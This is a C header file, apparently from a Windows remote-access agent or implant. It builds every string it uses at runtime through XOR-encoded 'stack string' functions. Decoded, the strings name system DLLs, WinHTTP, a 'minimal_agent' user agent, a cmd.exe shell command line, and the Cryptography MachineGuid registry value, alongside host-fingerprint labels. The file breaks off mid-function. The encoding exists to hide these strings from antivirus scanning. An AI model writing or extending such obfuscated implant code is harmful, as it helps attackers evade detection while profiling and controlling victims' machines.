#pragma once
#include "types.h"
#include "wintypes.h"

#define STACKSTR_KEY_KERNEL32 0x5A

#define STACKSTR_KEY_NTDLL 0x3C

#define STACKSTR_KEY_ADVAPI32 0xA7

#define STACKSTR_KEY_WINHTTP 0x71

static VOID StrKernel32(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_KERNEL32;
    buf[0] = (WCHAR)(0x31u ^ key);
    buf[1] = (WCHAR)(0x3Fu ^ key);
    buf[2] = (WCHAR)(0x28u ^ key);
    buf[3] = (WCHAR)(0x34u ^ key);
    buf[4] = (WCHAR)(0x3Fu ^ key);
    buf[5] = (WCHAR)(0x36u ^ key);
    buf[6] = (WCHAR)(0x69u ^ key);
    buf[7] = (WCHAR)(0x68u ^ key);
    buf[8] = (WCHAR)(0x74u ^ key);
    buf[9] = (WCHAR)(0x3Eu ^ key);
    buf[10] = (WCHAR)(0x36u ^ key);
    buf[11] = (WCHAR)(0x36u ^ key);
    buf[12] = 0;
}

#define STRLEN_BYTES_KERNEL32 24

static VOID StrNtdll(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_NTDLL;
    buf[0] = (WCHAR)(0x52u ^ key);
    buf[1] = (WCHAR)(0x48u ^ key);
    buf[2] = (WCHAR)(0x58u ^ key);
    buf[3] = (WCHAR)(0x50u ^ key);
    buf[4] = (WCHAR)(0x50u ^ key);
    buf[5] = (WCHAR)(0x12u ^ key);
    buf[6] = (WCHAR)(0x58u ^ key);
    buf[7] = (WCHAR)(0x50u ^ key);
    buf[8] = (WCHAR)(0x50u ^ key);
    buf[9] = 0;
}

#define STRLEN_BYTES_NTDLL 18

static VOID StrAdvapi32(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_ADVAPI32;
    buf[0] = (WCHAR)(0xC6u ^ key);
    buf[1] = (WCHAR)(0xC3u ^ key);
    buf[2] = (WCHAR)(0xD1u ^ key);
    buf[3] = (WCHAR)(0xC6u ^ key);
    buf[4] = (WCHAR)(0xD7u ^ key);
    buf[5] = (WCHAR)(0xCEu ^ key);
    buf[6] = (WCHAR)(0x94u ^ key);
    buf[7] = (WCHAR)(0x95u ^ key);
    buf[8] = (WCHAR)(0x89u ^ key);
    buf[9] = (WCHAR)(0xC3u ^ key);
    buf[10] = (WCHAR)(0xCBu ^ key);
    buf[11] = (WCHAR)(0xCBu ^ key);
    buf[12] = 0;
}

#define STRLEN_BYTES_ADVAPI32 24

static VOID StrWinhttp(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_WINHTTP;
    buf[0] = (WCHAR)(0x06u ^ key);
    buf[1] = (WCHAR)(0x18u ^ key);
    buf[2] = (WCHAR)(0x1Fu ^ key);
    buf[3] = (WCHAR)(0x19u ^ key);
    buf[4] = (WCHAR)(0x05u ^ key);
    buf[5] = (WCHAR)(0x05u ^ key);
    buf[6] = (WCHAR)(0x01u ^ key);
    buf[7] = (WCHAR)(0x5Fu ^ key);
    buf[8] = (WCHAR)(0x15u ^ key);
    buf[9] = (WCHAR)(0x1Du ^ key);
    buf[10] = (WCHAR)(0x1Du ^ key);
    buf[11] = 0;
}

#define STRLEN_BYTES_WINHTTP 22

#define STACKSTR_KEY_WIN 0x6B
#define STACKSTR_KEY_UA 0xC3
#define STACKSTR_KEY_CMD 0x94
#define STACKSTR_KEY_REG 0x37
#define STACKSTR_KEY_GUID 0x5D

static VOID StrPlatformWindows(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_WIN;
    buf[0] = (CHAR)(0x3Cu ^ key);
    buf[1] = (CHAR)(0x02u ^ key);
    buf[2] = (CHAR)(0x05u ^ key);
    buf[3] = (CHAR)(0x0Fu ^ key);
    buf[4] = (CHAR)(0x04u ^ key);
    buf[5] = (CHAR)(0x1Cu ^ key);
    buf[6] = (CHAR)(0x18u ^ key);
    buf[7] = 0;
}

#define STRLEN_BYTES_PLATFORMWINDOWS 7

static VOID StrUserAgent(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_UA;
    buf[0] = (WCHAR)(0xAEu ^ key);
    buf[1] = (WCHAR)(0xAAu ^ key);
    buf[2] = (WCHAR)(0xADu ^ key);
    buf[3] = (WCHAR)(0xAAu ^ key);
    buf[4] = (WCHAR)(0xAEu ^ key);
    buf[5] = (WCHAR)(0xA2u ^ key);
    buf[6] = (WCHAR)(0xAFu ^ key);
    buf[7] = (WCHAR)(0x9Cu ^ key);
    buf[8] = (WCHAR)(0xA2u ^ key);
    buf[9] = (WCHAR)(0xA4u ^ key);
    buf[10] = (WCHAR)(0xA6u ^ key);
    buf[11] = (WCHAR)(0xADu ^ key);
    buf[12] = (WCHAR)(0xB7u ^ key);
    buf[13] = (WCHAR)(0xECu ^ key);
    buf[14] = (WCHAR)(0xF2u ^ key);
    buf[15] = (WCHAR)(0xEDu ^ key);
    buf[16] = (WCHAR)(0xF3u ^ key);
    buf[17] = 0;
}

#define STRLEN_BYTES_USERAGENT 17

static VOID StrCmdline(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_CMD;
    buf[0] = (WCHAR)(0xF7u ^ key);
    buf[1] = (WCHAR)(0xF9u ^ key);
    buf[2] = (WCHAR)(0xF0u ^ key);
    buf[3] = (WCHAR)(0xBAu ^ key);
    buf[4] = (WCHAR)(0xF1u ^ key);
    buf[5] = (WCHAR)(0xECu ^ key);
    buf[6] = (WCHAR)(0xF1u ^ key);
    buf[7] = (WCHAR)(0xB4u ^ key);
    buf[8] = (WCHAR)(0xBBu ^ key);
    buf[9] = (WCHAR)(0xDFu ^ key);
    buf[10] = (WCHAR)(0xB4u ^ key);
    buf[11] = (WCHAR)(0xF7u ^ key);
    buf[12] = (WCHAR)(0xFCu ^ key);
    buf[13] = (WCHAR)(0xF7u ^ key);
    buf[14] = (WCHAR)(0xE4u ^ key);
    buf[15] = (WCHAR)(0xB4u ^ key);
    buf[16] = (WCHAR)(0xA2u ^ key);
    buf[17] = (WCHAR)(0xA1u ^ key);
    buf[18] = (WCHAR)(0xA4u ^ key);
    buf[19] = (WCHAR)(0xA4u ^ key);
    buf[20] = (WCHAR)(0xA5u ^ key);
    buf[21] = (WCHAR)(0xB4u ^ key);
    buf[22] = (WCHAR)(0xAAu ^ key);
    buf[23] = (WCHAR)(0xFAu ^ key);
    buf[24] = (WCHAR)(0xE1u ^ key);
    buf[25] = (WCHAR)(0xF8u ^ key);
    buf[26] = 0;
}

#define STRLEN_BYTES_CMDLINE 26

static VOID StrRegPath(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_REG;
    buf[0] = (CHAR)(0x64u ^ key);
    buf[1] = (CHAR)(0x78u ^ key);
    buf[2] = (CHAR)(0x71u ^ key);
    buf[3] = (CHAR)(0x63u ^ key);
    buf[4] = (CHAR)(0x60u ^ key);
    buf[5] = (CHAR)(0x76u ^ key);
    buf[6] = (CHAR)(0x65u ^ key);
    buf[7] = (CHAR)(0x72u ^ key);
    buf[8] = (CHAR)(0x6Bu ^ key);
    buf[9] = (CHAR)(0x7Au ^ key);
    buf[10] = (CHAR)(0x5Eu ^ key);
    buf[11] = (CHAR)(0x54u ^ key);
    buf[12] = (CHAR)(0x45u ^ key);
    buf[13] = (CHAR)(0x58u ^ key);
    buf[14] = (CHAR)(0x44u ^ key);
    buf[15] = (CHAR)(0x58u ^ key);
    buf[16] = (CHAR)(0x51u ^ key);
    buf[17] = (CHAR)(0x43u ^ key);
    buf[18] = (CHAR)(0x6Bu ^ key);
    buf[19] = (CHAR)(0x74u ^ key);
    buf[20] = (CHAR)(0x45u ^ key);
    buf[21] = (CHAR)(0x4Eu ^ key);
    buf[22] = (CHAR)(0x47u ^ key);
    buf[23] = (CHAR)(0x43u ^ key);
    buf[24] = (CHAR)(0x58u ^ key);
    buf[25] = (CHAR)(0x50u ^ key);
    buf[26] = (CHAR)(0x45u ^ key);
    buf[27] = (CHAR)(0x56u ^ key);
    buf[28] = (CHAR)(0x47u ^ key);
    buf[29] = (CHAR)(0x5Fu ^ key);
    buf[30] = (CHAR)(0x4Eu ^ key);
    buf[31] = 0;
}

#define STRLEN_BYTES_REGPATH 31

static VOID StrMachineGuid(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_GUID;
    buf[0] = (CHAR)(0x10u ^ key);
    buf[1] = (CHAR)(0x3Cu ^ key);
    buf[2] = (CHAR)(0x3Eu ^ key);
    buf[3] = (CHAR)(0x35u ^ key);
    buf[4] = (CHAR)(0x34u ^ key);
    buf[5] = (CHAR)(0x33u ^ key);
    buf[6] = (CHAR)(0x38u ^ key);
    buf[7] = (CHAR)(0x1Au ^ key);
    buf[8] = (CHAR)(0x28u ^ key);
    buf[9] = (CHAR)(0x34u ^ key);
    buf[10] = (CHAR)(0x39u ^ key);
    buf[11] = 0;
}

#define STRLEN_BYTES_MACHINEGUID 11
#define STACKSTR_KEY_HASH 0x4E

static VOID StrEnvUrl(PCHAR buf)
{
    volatile UINT32 key = 0x4D;
    buf[0] = (CHAR)(0x18u ^ key);
    buf[1] = (CHAR)(0x1Fu ^ key);
    buf[2] = (CHAR)(0x01u ^ key);
    buf[3] = 0;
}

static VOID StrCommitDefault(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_HASH;
    buf[0] = (CHAR)(0x2Du ^ key);
    buf[1] = (CHAR)(0x21u ^ key);
    buf[2] = (CHAR)(0x3Bu ^ key);
    buf[3] = (CHAR)(0x3Cu ^ key);
    buf[4] = (CHAR)(0x3Du ^ key);
    buf[5] = (CHAR)(0x2Bu ^ key);
    buf[6] = (CHAR)(0x7Eu ^ key);
    buf[7] = (CHAR)(0x7Fu ^ key);
    buf[8] = 0;
}
#define STACKSTR_KEY_X64 0x2D

static VOID StrX64(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_X64;
    buf[0] = (CHAR)(0x55u ^ key);
    buf[1] = (CHAR)(0x1Bu ^ key);
    buf[2] = (CHAR)(0x19u ^ key);
    buf[3] = 0;
}

#define STACKSTR_KEY_X86 0xE1

static VOID StrX86(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_X86;
    buf[0] = (CHAR)(0x99u ^ key);
    buf[1] = (CHAR)(0xD9u ^ key);
    buf[2] = (CHAR)(0xD7u ^ key);
    buf[3] = 0;
}

#define STACKSTR_KEY_GET 0x7A

static VOID StrGetMethod(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_GET;
    buf[0] = (CHAR)(0x3Du ^ key);
    buf[1] = (CHAR)(0x3Fu ^ key);
    buf[2] = (CHAR)(0x2Eu ^ key);
    buf[3] = 0;
}
#define STACKSTR_KEY_GETW 0x7A

static VOID StrGetMethodW(PWCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_GETW;
    buf[0] = (WCHAR)(0x3Du ^ key);
    buf[1] = (WCHAR)(0x3Fu ^ key);
    buf[2] = (WCHAR)(0x2Eu ^ key);
    buf[3] = 0;
}

static VOID StrHdrApiVersion(PCHAR buf)
{
    volatile UINT32 key = 0x6B;
    buf[0] = (CHAR)(0x33u ^ key);
    buf[1] = (CHAR)(0x46u ^ key);
    buf[2] = (CHAR)(0x2Au ^ key);
    buf[3] = (CHAR)(0x0Cu ^ key);
    buf[4] = (CHAR)(0x0Eu ^ key);
    buf[5] = (CHAR)(0x05u ^ key);
    buf[6] = (CHAR)(0x1Fu ^ key);
    buf[7] = (CHAR)(0x46u ^ key);
    buf[8] = (CHAR)(0x2Au ^ key);
    buf[9] = (CHAR)(0x1Bu ^ key);
    buf[10] = (CHAR)(0x02u ^ key);
    buf[11] = (CHAR)(0x46u ^ key);
    buf[12] = (CHAR)(0x3Du ^ key);
    buf[13] = (CHAR)(0x0Eu ^ key);
    buf[14] = (CHAR)(0x19u ^ key);
    buf[15] = (CHAR)(0x18u ^ key);
    buf[16] = (CHAR)(0x02u ^ key);
    buf[17] = (CHAR)(0x04u ^ key);
    buf[18] = (CHAR)(0x05u ^ key);
    buf[19] = (CHAR)(0x51u ^ key);
    buf[20] = (CHAR)(0x4Bu ^ key);
    buf[21] = (CHAR)(0x5Au ^ key);
    buf[22] = (CHAR)(0x66u ^ key);
    buf[23] = (CHAR)(0x61u ^ key);
    buf[24] = 0;
}

static VOID StrHdrNameId(PCHAR buf)
{
    volatile UINT32 key = 0x39;
    buf[0] = (CHAR)(0x61u ^ key);
    buf[1] = (CHAR)(0x14u ^ key);
    buf[2] = (CHAR)(0x78u ^ key);
    buf[3] = (CHAR)(0x5Eu ^ key);
    buf[4] = (CHAR)(0x5Cu ^ key);
    buf[5] = (CHAR)(0x57u ^ key);
    buf[6] = (CHAR)(0x4Du ^ key);
    buf[7] = (CHAR)(0x14u ^ key);
    buf[8] = (CHAR)(0x77u ^ key);
    buf[9] = (CHAR)(0x58u ^ key);
    buf[10] = (CHAR)(0x54u ^ key);
    buf[11] = (CHAR)(0x5Cu ^ key);
    buf[12] = (CHAR)(0x14u ^ key);
    buf[13] = (CHAR)(0x70u ^ key);
    buf[14] = (CHAR)(0x5Du ^ key);
    buf[15] = (CHAR)(0x03u ^ key);
    buf[16] = (CHAR)(0x19u ^ key);
    buf[17] = (CHAR)(0x0Du ^ key);
    buf[18] = (CHAR)(0x34u ^ key);
    buf[19] = (CHAR)(0x33u ^ key);
    buf[20] = 0;
}

static VOID StrHdrPlatform(PCHAR buf)
{
    volatile UINT32 key = 0x52;
    buf[0] = (CHAR)(0x0Au ^ key);
    buf[1] = (CHAR)(0x7Fu ^ key);
    buf[2] = (CHAR)(0x13u ^ key);
    buf[3] = (CHAR)(0x35u ^ key);
    buf[4] = (CHAR)(0x37u ^ key);
    buf[5] = (CHAR)(0x3Cu ^ key);
    buf[6] = (CHAR)(0x26u ^ key);
    buf[7] = (CHAR)(0x7Fu ^ key);
    buf[8] = (CHAR)(0x02u ^ key);
    buf[9] = (CHAR)(0x3Eu ^ key);
    buf[10] = (CHAR)(0x33u ^ key);
    buf[11] = (CHAR)(0x26u ^ key);
    buf[12] = (CHAR)(0x34u ^ key);
    buf[13] = (CHAR)(0x3Du ^ key);
    buf[14] = (CHAR)(0x20u ^ key);
    buf[15] = (CHAR)(0x3Fu ^ key);
    buf[16] = (CHAR)(0x68u ^ key);
    buf[17] = (CHAR)(0x72u ^ key);
    buf[18] = (CHAR)(0x25u ^ key);
    buf[19] = (CHAR)(0x3Bu ^ key);
    buf[20] = (CHAR)(0x3Cu ^ key);
    buf[21] = (CHAR)(0x36u ^ key);
    buf[22] = (CHAR)(0x3Du ^ key);
    buf[23] = (CHAR)(0x25u ^ key);
    buf[24] = (CHAR)(0x21u ^ key);
    buf[25] = (CHAR)(0x5Fu ^ key);
    buf[26] = (CHAR)(0x58u ^ key);
    buf[27] = 0;
}

static VOID StrHdrCaps(PCHAR buf)
{
    volatile UINT32 key = 0x7D;
    buf[0] = (CHAR)(0x25u ^ key);
    buf[1] = (CHAR)(0x50u ^ key);
    buf[2] = (CHAR)(0x3Cu ^ key);
    buf[3] = (CHAR)(0x1Au ^ key);
    buf[4] = (CHAR)(0x18u ^ key);
    buf[5] = (CHAR)(0x13u ^ key);
    buf[6] = (CHAR)(0x09u ^ key);
    buf[7] = (CHAR)(0x50u ^ key);
    buf[8] = (CHAR)(0x3Eu ^ key);
    buf[9] = (CHAR)(0x1Cu ^ key);
    buf[10] = (CHAR)(0x0Du ^ key);
    buf[11] = (CHAR)(0x1Cu ^ key);
    buf[12] = (CHAR)(0x1Fu ^ key);
    buf[13] = (CHAR)(0x14u ^ key);
    buf[14] = (CHAR)(0x11u ^ key);
    buf[15] = (CHAR)(0x14u ^ key);
    buf[16] = (CHAR)(0x09u ^ key);
    buf[17] = (CHAR)(0x14u ^ key);
    buf[18] = (CHAR)(0x18u ^ key);
    buf[19] = (CHAR)(0x0Eu ^ key);
    buf[20] = (CHAR)(0x47u ^ key);
    buf[21] = (CHAR)(0x5Du ^ key);
    buf[22] = (CHAR)(0x4Du ^ key);
    buf[23] = (CHAR)(0x4Cu ^ key);
    buf[24] = (CHAR)(0x4Du ^ key);
    buf[25] = (CHAR)(0x4Du ^ key);
    buf[26] = (CHAR)(0x4Du ^ key);
    buf[27] = (CHAR)(0x4Du ^ key);
    buf[28] = (CHAR)(0x4Du ^ key);
    buf[29] = (CHAR)(0x4Du ^ key);
    buf[30] = (CHAR)(0x4Du ^ key);
    buf[31] = (CHAR)(0x4Du ^ key);
    buf[32] = (CHAR)(0x4Du ^ key);
    buf[33] = (CHAR)(0x4Du ^ key);
    buf[34] = (CHAR)(0x4Du ^ key);
    buf[35] = (CHAR)(0x4Du ^ key);
    buf[36] = (CHAR)(0x4Du ^ key);
    buf[37] = (CHAR)(0x4Du ^ key);
    buf[38] = (CHAR)(0x70u ^ key);
    buf[39] = (CHAR)(0x77u ^ key);
    buf[40] = 0;
}

static VOID StrLblUuid(PCHAR buf)
{
    volatile UINT32 key = 0x1F;
    buf[0] = (CHAR)(0x47u ^ key);
    buf[1] = (CHAR)(0x32u ^ key);
    buf[2] = (CHAR)(0x5Eu ^ key);
    buf[3] = (CHAR)(0x78u ^ key);
    buf[4] = (CHAR)(0x7Au ^ key);
    buf[5] = (CHAR)(0x71u ^ key);
    buf[6] = (CHAR)(0x6Bu ^ key);
    buf[7] = (CHAR)(0x32u ^ key);
    buf[8] = (CHAR)(0x52u ^ key);
    buf[9] = (CHAR)(0x7Eu ^ key);
    buf[10] = (CHAR)(0x7Cu ^ key);
    buf[11] = (CHAR)(0x77u ^ key);
    buf[12] = (CHAR)(0x76u ^ key);
    buf[13] = (CHAR)(0x71u ^ key);
    buf[14] = (CHAR)(0x7Au ^ key);
    buf[15] = (CHAR)(0x32u ^ key);
    buf[16] = (CHAR)(0x4Au ^ key);
    buf[17] = (CHAR)(0x6Au ^ key);
    buf[18] = (CHAR)(0x76u ^ key);
    buf[19] = (CHAR)(0x7Bu ^ key);
    buf[20] = (CHAR)(0x25u ^ key);
    buf[21] = (CHAR)(0x3Fu ^ key);
    buf[22] = 0;
}

static VOID StrLblHostname(PCHAR buf)
{
    volatile UINT32 key = 0x64;
    buf[0] = (CHAR)(0x3Cu ^ key);
    buf[1] = (CHAR)(0x49u ^ key);
    buf[2] = (CHAR)(0x25u ^ key);
    buf[3] = (CHAR)(0x03u ^ key);
    buf[4] = (CHAR)(0x01u ^ key);
    buf[5] = (CHAR)(0x0Au ^ key);
    buf[6] = (CHAR)(0x10u ^ key);
    buf[7] = (CHAR)(0x49u ^ key);
    buf[8] = (CHAR)(0x2Cu ^ key);
    buf[9] = (CHAR)(0x0Bu ^ key);
    buf[10] = (CHAR)(0x17u ^ key);
    buf[11] = (CHAR)(0x10u ^ key);
    buf[12] = (CHAR)(0x0Au ^ key);
    buf[13] = (CHAR)(0x05u ^ key);
    buf[14] = (CHAR)(0x09u ^ key);
    buf[15] = (CHAR)(0x01u ^ key);
    buf[16] = (CHAR)(0x5Eu ^ key);
    buf[17] = (CHAR)(0x44u ^ key);
    buf[18] = 0;
}

static VOID StrLblUsername(PCHAR buf)
{
    volatile UINT32 key = 0x2A;
    buf[0] = (CHAR)(0x72u ^ key);
    buf[1] = (CHAR)(0x07u ^ key);
    buf[2] = (CHAR)(0x6Bu ^ key);
    buf[3] = (CHAR)(0x4Du ^ key);
    buf[4] = (CHAR)(0x4Fu ^ key);
    buf[5] = (CHAR)(0x44u ^ key);
    buf[6] = (CHAR)(0x5Eu ^ key);
    buf[7] = (CHAR)(0x07u ^ key);
    buf[8] = (CHAR)(0x7Fu ^ key);
    buf[9] = (CHAR)(0x59u ^ key);
    buf[10] = (CHAR)(0x4Fu ^ key);
    buf[11] = (CHAR)(0x58u ^ key);
    buf[12] = (CHAR)(0x44u ^ key);
    buf[13] = (CHAR)(0x4Bu ^ key);
    buf[14] = (CHAR)(0x47u ^ key);
    buf[15] = (CHAR)(0x4Fu ^ key);
    buf[16] = (CHAR)(0x10u ^ key);
    buf[17] = (CHAR)(0x0Au ^ key);
    buf[18] = 0;
}

static VOID StrLblOsVersion(PCHAR buf)
{
    volatile UINT32 key = 0x53;
    buf[0] = (CHAR)(0x0Bu ^ key);
    buf[1] = (CHAR)(0x7Eu ^ key);
    buf[2] = (CHAR)(0x12u ^ key);
    buf[3] = (CHAR)(0x34u ^ key);
    buf[4] = (CHAR)(0x36u ^ key);
    buf[5] = (CHAR)(0x3Du ^ key);
    buf[6] = (CHAR)(0x27u ^ key);
    buf[7] = (CHAR)(0x7Eu ^ key);
    buf[8] = (CHAR)(0x1Cu ^ key);
    buf[9] = (CHAR)(0x20u ^ key);
    buf[10] = (CHAR)(0x7Eu ^ key);
    buf[11] = (CHAR)(0x05u ^ key);
    buf[12] = (CHAR)(0x36u ^ key);
    buf[13] = (CHAR)(0x21u ^ key);
    buf[14] = (CHAR)(0x20u ^ key);
    buf[15] = (CHAR)(0x3Au ^ key);
    buf[16] = (CHAR)(0x3Cu ^ key);
    buf[17] = (CHAR)(0x3Du ^ key);
    buf[18] = (CHAR)(0x69u ^ key);
    buf[19] = (CHAR)(0x73u ^ key);
    buf[20] = 0;
}

static VOID StrLblBuild(PCHAR buf)
{
    volatile UINT32 key = 0x30;
    buf[0] = (CHAR)(0x68u ^ key);
    buf[1] = (CHAR)(0x1Du ^ key);
    buf[2] = (CHAR)(0x71u ^ key);
    buf[3] = (CHAR)(0x57u ^ key);
    buf[4] = (CHAR)(0x55u ^ key);
    buf[5] = (CHAR)(0x5Eu ^ key);
    buf[6] = (CHAR)(0x44u ^ key);
    buf[7] = (CHAR)(0x1Du ^ key);
    buf[8] = (CHAR)(0x72u ^ key);
    buf[9] = (CHAR)(0x45u ^ key);
    buf[10] = (CHAR)(0x59u ^ key);
    buf[11] = (CHAR)(0x5Cu ^ key);
    buf[12] = (CHAR)(0x54u ^ key);
    buf[13] = (CHAR)(0x0Au ^ key);
    buf[14] = (CHAR)(0x10u ^ key);
    buf[15] = 0;
}

static VOID StrLblCommit(PCHAR buf)
{
    volatile UINT32 key = 0x5B;
    buf[0] = (CHAR)(0x03u ^ key);
    buf[1] = (CHAR)(0x76u ^ key);
    buf[2] = (CHAR)(0x1Au ^ key);
    buf[3] = (CHAR)(0x3Cu ^ key);
    buf[4] = (CHAR)(0x3Eu ^ key);
    buf[5] = (CHAR)(0x35u ^ key);
    buf[6] = (CHAR)(0x2Fu ^ key);
    buf[7] = (CHAR)(0x76u ^ key);
    buf[8] = (CHAR)(0x18u ^ key);
    buf[9] = (CHAR)(0x34u ^ key);
    buf[10] = (CHAR)(0x36u ^ key);
    buf[11] = (CHAR)(0x36u ^ key);
    buf[12] = (CHAR)(0x32u ^ key);
    buf[13] = (CHAR)(0x2Fu ^ key);
    buf[14] = (CHAR)(0x61u ^ key);
    buf[15] = (CHAR)(0x7Bu ^ key);
    buf[16] = 0;
}

static VOID StrValArchX64(PCHAR buf)
{
    volatile UINT32 key = 0x24;
    buf[0] = (CHAR)(0x7Cu ^ key);
    buf[1] = (CHAR)(0x09u ^ key);
    buf[2] = (CHAR)(0x65u ^ key);
    buf[3] = (CHAR)(0x43u ^ key);
    buf[4] = (CHAR)(0x41u ^ key);
    buf[5] = (CHAR)(0x4Au ^ key);
    buf[6] = (CHAR)(0x50u ^ key);
    buf[7] = (CHAR)(0x09u ^ key);
    buf[8] = (CHAR)(0x65u ^ key);
    buf[9] = (CHAR)(0x56u ^ key);
    buf[10] = (CHAR)(0x47u ^ key);
    buf[11] = (CHAR)(0x4Cu ^ key);
    buf[12] = (CHAR)(0x1Eu ^ key);
    buf[13] = (CHAR)(0x04u ^ key);
    buf[14] = (CHAR)(0x5Cu ^ key);
    buf[15] = (CHAR)(0x1Cu ^ key);
    buf[16] = (CHAR)(0x12u ^ key);
    buf[17] = (CHAR)(0x7Bu ^ key);
    buf[18] = (CHAR)(0x12u ^ key);
    buf[19] = (CHAR)(0x10u ^ key);
    buf[20] = (CHAR)(0x29u ^ key);
    buf[21] = (CHAR)(0x2Eu ^ key);
    buf[22] = (CHAR)(0x7Cu ^ key);
    buf[23] = (CHAR)(0x09u ^ key);
    buf[24] = (CHAR)(0x65u ^ key);
    buf[25] = (CHAR)(0x43u ^ key);
    buf[26] = (CHAR)(0x41u ^ key);
    buf[27] = (CHAR)(0x4Au ^ key);
    buf[28] = (CHAR)(0x50u ^ key);
    buf[29] = (CHAR)(0x09u ^ key);
    buf[30] = (CHAR)(0x74u ^ key);
    buf[31] = (CHAR)(0x56u ^ key);
    buf[32] = (CHAR)(0x4Bu ^ key);
    buf[33] = (CHAR)(0x47u ^ key);
    buf[34] = (CHAR)(0x41u ^ key);
    buf[35] = (CHAR)(0x57u ^ key);
    buf[36] = (CHAR)(0x57u ^ key);
    buf[37] = (CHAR)(0x09u ^ key);
    buf[38] = (CHAR)(0x65u ^ key);
    buf[39] = (CHAR)(0x56u ^ key);
    buf[40] = (CHAR)(0x47u ^ key);
    buf[41] = (CHAR)(0x4Cu ^ key);
    buf[42] = (CHAR)(0x1Eu ^ key);
    buf[43] = (CHAR)(0x04u ^ key);
    buf[44] = (CHAR)(0x5Cu ^ key);
    buf[45] = (CHAR)(0x1Cu ^ key);
    buf[46] = (CHAR)(0x12u ^ key);
    buf[47] = (CHAR)(0x7Bu ^ key);
    buf[48] = (CHAR)(0x12u ^ key);
    buf[49] = (CHAR)(0x10u ^ key);
    buf[50] = (CHAR)(0x29u ^ key);
    buf[51] = (CHAR)(0x2Eu ^ key);
    buf[52] = 0;
}

static VOID StrValArchI386(PCHAR buf)
{
    volatile UINT32 key = 0x37;
    buf[0] = (CHAR)(0x6Fu ^ key);
    buf[1] = (CHAR)(0x1Au ^ key);
    buf[2] = (CHAR)(0x76u ^ key);
    buf[3] = (CHAR)(0x50u ^ key);
    buf[4] = (CHAR)(0x52u ^ key);
    buf[5] = (CHAR)(0x59u ^ key);
    buf[6] = (CHAR)(0x43u ^ key);
    buf[7] = (CHAR)(0x1Au ^ key);
    buf[8] = (CHAR)(0x76u ^ key);
    buf[9] = (CHAR)(0x45u ^ key);
    buf[10] = (CHAR)(0x54u ^ key);
    buf[11] = (CHAR)(0x5Fu ^ key);
    buf[12] = (CHAR)(0x0Du ^ key);
    buf[13] = (CHAR)(0x17u ^ key);
    buf[14] = (CHAR)(0x5Eu ^ key);
    buf[15] = (CHAR)(0x04u ^ key);
    buf[16] = (CHAR)(0x0Fu ^ key);
    buf[17] = (CHAR)(0x01u ^ key);
    buf[18] = (CHAR)(0x3Au ^ key);
    buf[19] = (CHAR)(0x3Du ^ key);
    buf[20] = (CHAR)(0x6Fu ^ key);
    buf[21] = (CHAR)(0x1Au ^ key);
    buf[22] = (CHAR)(0x76u ^ key);
    buf[23] = (CHAR)(0x50u ^ key);
    buf[24] = (CHAR)(0x52u ^ key);
    buf[25] = (CHAR)(0x59u ^ key);
    buf[26] = (CHAR)(0x43u ^ key);
    buf[27] = (CHAR)(0x1Au ^ key);
    buf[28] = (CHAR)(0x67u ^ key);
    buf[29] = (CHAR)(0x45u ^ key);
    buf[30] = (CHAR)(0x58u ^ key);
    buf[31] = (CHAR)(0x54u ^ key);
    buf[32] = (CHAR)(0x52u ^ key);
    buf[33] = (CHAR)(0x44u ^ key);
    buf[34] = (CHAR)(0x44u ^ key);
    buf[35] = (CHAR)(0x1Au ^ key);
    buf[36] = (CHAR)(0x76u ^ key);
    buf[37] = (CHAR)(0x45u ^ key);
    buf[38] = (CHAR)(0x54u ^ key);
    buf[39] = (CHAR)(0x5Fu ^ key);
    buf[40] = (CHAR)(0x0Du ^ key);
    buf[41] = (CHAR)(0x17u ^ key);
    buf[42] = (CHAR)(0x5Eu ^ key);
    buf[43] = (CHAR)(0x04u ^ key);
    buf[44] = (CHAR)(0x0Fu ^ key);
    buf[45] = (CHAR)(0x01u ^ key);
    buf[46] = (CHAR)(0x3Au ^ key);
    buf[47] = (CHAR)(0x3Du ^ key);
    buf[48] = 0;
}

static VOID StrValArchArm64(PCHAR buf)
{
    volatile UINT32 key = 0x35;
    buf[0] = (CHAR)(0x6Du ^ key);
    buf[1] = (CHAR)(0x18u ^ key);
    buf[2] = (CHAR)(0x74u ^ key);
    buf[3] = (CHAR)(0x52u ^ key);
    buf[4] = (CHAR)(0x50u ^ key);
    buf[5] = (CHAR)(0x5Bu ^ key);
    buf[6] = (CHAR)(0x41u ^ key);
    buf[7] = (CHAR)(0x18u ^ key);
    buf[8] = (CHAR)(0x74u ^ key);
    buf[9] = (CHAR)(0x47u ^ key);
    buf[10] = (CHAR)(0x56u ^ key);
    buf[11] = (CHAR)(0x5Du ^ key);
    buf[12] = (CHAR)(0x0Fu ^ key);
    buf[13] = (CHAR)(0x15u ^ key);
    buf[14] = (CHAR)(0x54u ^ key);
    buf[15] = (CHAR)(0x54u ^ key);
    buf[16] = (CHAR)(0x47u ^ key);
    buf[17] = (CHAR)(0x56u ^ key);
    buf[18] = (CHAR)(0x5Du ^ key);
    buf[19] = (CHAR)(0x03u ^ key);
    buf[20] = (CHAR)(0x01u ^ key);
    buf[21] = (CHAR)(0x38u ^ key);
    buf[22] = (CHAR)(0x3Fu ^ key);
    buf[23] = (CHAR)(0x6Du ^ key);
    buf[24] = (CHAR)(0x18u ^ key);
    buf[25] = (CHAR)(0x74u ^ key);
    buf[26] = (CHAR)(0x52u ^ key);
    buf[27] = (CHAR)(0x50u ^ key);
    buf[28] = (CHAR)(0x5Bu ^ key);
    buf[29] = (CHAR)(0x41u ^ key);
    buf[30] = (CHAR)(0x18u ^ key);
    buf[31] = (CHAR)(0x65u ^ key);
    buf[32] = (CHAR)(0x47u ^ key);
    buf[33] = (CHAR)(0x5Au ^ key);
    buf[34] = (CHAR)(0x56u ^ key);
    buf[35] = (CHAR)(0x50u ^ key);
    buf[36] = (CHAR)(0x46u ^ key);
